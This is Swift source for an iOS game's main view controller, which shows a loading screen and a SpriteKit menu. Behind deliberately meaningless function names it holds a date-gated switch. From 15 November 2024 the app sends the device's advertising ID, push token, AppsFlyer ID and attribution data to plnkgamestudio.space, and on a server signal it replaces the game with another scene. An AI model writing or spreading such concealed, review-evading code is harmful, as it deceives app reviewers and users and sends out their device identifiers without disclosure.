import UIKit
import SwiftUI
import SwiftyJSON
import AppsFlyerLib
import WebKit
import SpriteKit

class GameViewController: UIViewController {
    
    private var notificationsPushTokenReceived = false
    private var fromAppsDataHasCome = false
    private var dnsajkdnasjkdsa = false
    private var timePassed = false

    private var appsData: [AnyHashable: Any] = [:]
    
    override func viewDidLoad() {
        super.viewDidLoad()
        showLoadingView()
        
        dnsajkda = WKWebView().value(forKey: "userAgent") as? String ?? ""
                
        NotificationCenter.default.addObserver(self, selector: #selector(conversionApps), name: Notification.Name("conv_loaded"), object: nil)
        NotificationCenter.default.addObserver(self, selector: #selector(fcmReceivedPushToken), name: Notification.Name("fcm_token"), object: nil)
    }
    
    private var loadingTime = 0
    private var dnsajkda = ""
    private var loadingTimer = Timer()
    
    @objc func conversionApps(notification: Notification) {
        guard let info = notification.userInfo as? [String: Any],
              let appsConvData = info["data"] as? [AnyHashable: Any] else { return }
        fromAppsDataHasCome = true
        appsData = appsConvData
        loadingTimer = .scheduledTimer(timeInterval: 1, target: self, selector: #selector(timerLoading), userInfo: nil, repeats: true)
        if notificationsPushTokenReceived {
            loadContentShopItemsIfNeed(data: appsData)
        } else {
            if timePassed {
                loadContentShopItemsIfNeed(data: appsData)
            }
        }
    }
    
    func dasbjdhasd() -> Bool {
        let dbsajdbsajsd = Calendar.current
        let currentDate = Date()
        var dc = DateComponents()
        dc.year = 2024
        dc.month = 11
        dc.day = 15
        if let targetDate = dbsajdbsajsd.date(from: dc) {
            return currentDate >= targetDate
        }
        return false
    }
    
    @objc private func fcmReceivedPushToken(notification: Notification) {
        notificationsPushTokenReceived = true
        if fromAppsDataHasCome {
            loadContentShopItemsIfNeed(data: appsData)
        }
    }
    
    private var loadingView: UIHostingController<LoadingView>!
    
    private func showLoadingView() {
        loadingView = UIHostingController(rootView: LoadingView())
        addChild(loadingView)
        loadingView.view.frame = view.bounds
        view.addSubview(loadingView.view)
        loadingView.didMove(toParent: self)
    }
    
    @objc private func timerLoading() {
        loadingTime += 1
        if loadingTime == 5 {
            timePassed = true
            loadingTimer.invalidate()
            if !notificationsPushTokenReceived {
                if !dnsajkdnasjkdsa {
                    dnsajkdnasjkdsa = true
                    loadContentShopItemsIfNeed(data: appsData)
                }
            }
        }
    }
    
    private func showMenu() {
        if let view = self.view as? SKView {
            if let menuScene = MenuScene(fileNamed: "Menu") {
                menuScene.scaleMode = .aspectFill
                view.presentScene(menuScene)
            }
        } else {
            let skView = SKView(frame: view.bounds)
            self.view.addSubview(skView)
            
            if let menuScene = MenuScene(fileNamed: "Menu") {
                menuScene.scaleMode = .aspectFill
                skView.presentScene(menuScene)
            }
        }
    }
    
    func loadContentShopItemsIfNeed(data: [AnyHashable: Any]) {
        if dasbjdhasd() {
            dnsahjdbasjhda()
        } else {
            DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) {
                self.loadedLoading()
            }
        }
    }
    
    private func loadedLoading(avs: Bool = false) {
        loadingView.willMove(toParent: nil)
        loadingView.view.removeFromSuperview()
        loadingView.removeFromParent()
        if avs {
            let newGameScene = UIHostingController(rootView: NewGameViewScene())
            addChild(newGameScene)
            newGameScene.view.frame = view.bounds
            view.addSubview(newGameScene.view)
            newGameScene.didMove(toParent: self)
        } else {
            self.showMenu()
        }
    }
    
    private func dnsahjdbasjhda() {
        if !UserDefaults.standard.bool(forKey: "aas") && !UserDefaults.standard.bool(forKey: "cac") {
            dnsajkdnasjkdsa = true
            let userId = UserDefaults.standard.string(forKey: "client_id") ?? ""
            let finalizedL = "https://plnkgamestudio.space/session/v3/05d14b70-69ae-46b8-9e29-9161dbfc65e2?idfa=\(UserDefaults.standard.string(forKey: "idfa_user_app") ?? "")&firebase_push_token=\(UserDefaults.standard.string(forKey: "fcm_token") ?? "")&apps_flyer_id=\(AppsFlyerLib.shared().getAppsFlyerUID())\(userId.isEmpty ? "" : "&client_id=\(userId)")"
            
            guard let finalized = URL(string: finalizedL) else {
                DispatchQueue.main.async {
                    self.loadedLoading(avs: true)
                }
                return
            }
            
            var finalizedDD = URLRequest(url: finalized)
            finalizedDD.addValue(dnsajkda, forHTTPHeaderField: "User-Agent")
            finalizedDD.httpMethod = "POST"
            finalizedDD.addValue("application/json", forHTTPHeaderField: "Content-Type")
            
            do {
                finalizedDD.httpBody = try JSONEncoder().encode(GamesDataD(gamesDataEncoded: try JSON(data: try JSONSerialization.data(withJSONObject: appsData, options: []))))
            } catch {
            }
            
            URLSession.shared.dataTask(with: finalizedDD) { data, response, error in
                guard let resp = response as? HTTPURLResponse,
                      (200...299).contains(resp.statusCode) else {
                    DispatchQueue.main.async {
                        self.loadedLoading()
                    }
                    return
                }
                
                if let data = data {
                    do {
                        let gamesD = try JSONDecoder().decode(GamesDataR.self, from: data)
                        UserDefaults.standard.set(gamesD.sid, forKey: "session_id")
                        UserDefaults.standard.set(gamesD.userId, forKey: "client_id")
                        if gamesD.respikk != nil {
                            UserDefaults.standard.set(gamesD.respikk, forKey: "resp")
                            DispatchQueue.main.async { self.loadedLoading(avs: true) }
                        } else {
                            DispatchQueue.main.async {
                                self.loadedLoading()
                            }
                        }
                    } catch {
                    }
                }
            }.resume()
        }
    }
    
    @objc private func showGameScene() {
        if let view = self.view as? SKView {
            if let scene = GameScene(fileNamed: "GameScene") {
                scene.scaleMode = .aspectFill
                view.presentScene(scene)
            }

            view.ignoresSiblingOrder = true
            view.showsFPS = true
            view.showsNodeCount = true
        } else {
            let skView = SKView(frame: view.bounds)
            self.view.addSubview(skView)

            if let scene = GameScene(fileNamed: "GameScene") {
                scene.scaleMode = .aspectFill
                skView.presentScene(scene)
            }

            skView.ignoresSiblingOrder = true
            skView.showsFPS = true
            skView.showsNodeCount = true
        }
    }
}

